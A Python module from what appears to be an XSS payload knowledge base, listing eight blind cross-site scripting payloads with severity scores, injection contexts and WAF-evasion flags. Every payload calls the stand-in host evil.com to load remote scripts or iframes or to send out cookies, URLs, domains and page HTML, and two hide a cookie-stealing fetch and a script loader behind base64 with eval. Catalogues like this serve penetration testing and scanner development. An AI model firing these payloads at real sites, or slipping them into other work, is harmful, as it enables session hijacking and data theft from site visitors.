#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Blind XSS Payloads
"""

from ..models import PayloadEntry


BLIND_XSS_PAYLOADS = {
    "blind_1": PayloadEntry(
        payload='"><script src=//evil.com/xss.js></script>',
        contexts=["html_content", "html_attribute"],
        severity="critical",
        cvss_score=9.0,
        description="External script blind XSS",
        tags=["blind", "external", "script"],
        reliability="high",
    ),
    "blind_2": PayloadEntry(
        payload="'><script src=//evil.com/xss.js></script>",
        contexts=["html_content", "html_attribute"],
        severity="critical",
        cvss_score=9.0,
        description="Single quote external script",
        tags=["blind", "external", "script"],
        reliability="high",
    ),
    "blind_3": PayloadEntry(
        payload="<img src=x onerror=eval(atob('ZmV0Y2goJy8vZXZpbC5jb20vP3gnK2RvY3VtZW50LmNvb2tpZSk='))>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=9.0,
        description="Base64 encoded blind callback",
        tags=["blind", "base64", "callback"],
        waf_evasion=True,
        reliability="high",
    ),
    "blind_4": PayloadEntry(
        payload="<script>var i=new Image();i.src='//evil.com/log?'+document.domain;</script>",
        contexts=["html_content"],
        severity="high",
        cvss_score=8.0,
        description="Domain detection blind XSS",
        tags=["blind", "domain", "detection"],
        reliability="high",
    ),
    "blind_5": PayloadEntry(
        payload="<script>fetch('//evil.com/log?url='+encodeURIComponent(location.href)+'&cookie='+encodeURIComponent(document.cookie))</script>",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=9.0,
        description="Full context blind XSS",
        tags=["blind", "context", "full"],
        reliability="high",
    ),
    "blind_6": PayloadEntry(
        payload="<script>fetch('//evil.com/log',{method:'POST',body:JSON.stringify({url:location.href,cookie:document.cookie,dom:document.documentElement.outerHTML.slice(0,10000)})})</script>",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=9.5,
        description="DOM exfil blind XSS",
        tags=["blind", "dom", "exfil"],
        reliability="high",
    ),
    "blind_7": PayloadEntry(
        payload="<iframe src=//evil.com/xss.html>",
        contexts=["html_content"],
        severity="high",
        cvss_score=8.0,
        description="Iframe blind XSS",
        tags=["blind", "iframe"],
        reliability="medium",
    ),
    "blind_8": PayloadEntry(
        payload='"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8vZXZpbC5jb20veHNzLmpzIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEp onerror=eval(atob(this.id))>',
        contexts=["html_content"],
        severity="critical",
        cvss_score=9.0,
        description="Self-contained base64 loader",
        tags=["blind", "base64", "self-contained"],
        waf_evasion=True,
        reliability="high",
    ),
}

BLIND_XSS_PAYLOADS_TOTAL = len(BLIND_XSS_PAYLOADS)
